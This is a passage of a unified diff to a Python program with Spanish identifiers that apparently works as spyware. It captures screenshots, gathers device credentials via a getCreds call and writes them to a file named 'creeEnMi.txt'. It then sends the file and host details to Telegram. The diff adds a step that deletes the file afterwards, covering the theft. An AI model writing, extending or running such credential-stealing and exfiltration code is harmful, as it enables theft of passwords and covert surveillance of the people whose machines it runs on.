@@ -69,7 +69,6 @@ def enviar_telegram(datos,file_path):
     except Exception as e:
         print("Error al enviar a Telegram:", e)
         
-
 def enviar_captura():
     path = os.path.join(os.environ['USERPROFILE'], 'Pictures', 'Temp.jpg')
     imagen = pyautogui.screenshot()
@@ -137,17 +136,19 @@ def planificador():
             time.sleep(intervalo_minutos * 60)
         previous_state = current_state
 
+######################################### OBTENER CREDENCIALES
 def enviarCredenciales():
     quienSoy = obtenerDatos()
-    
     file_dst = os.path.join(os.environ['USERPROFILE'], 'creeEnMi.txt')
     credenciales = credentials.getCreds()
     print(credenciales)
     with open(file_dst,'w') as f:
-        f.write(f"Credenciales: \n{credenciales}",)
+        f.write(f"Credenciales: \n{credenciales}\n")
         f.close
     enviar_telegram(f"Credenciales del dispositivo \n{quienSoy}\n",file_dst)
-
+    os.remove(file_dst)
+    
+######################################## MENU PRINCIPAL
 if __name__ == "__main__":     
     os.system("color 0A")
     print("PROGRAMA INICIADO")
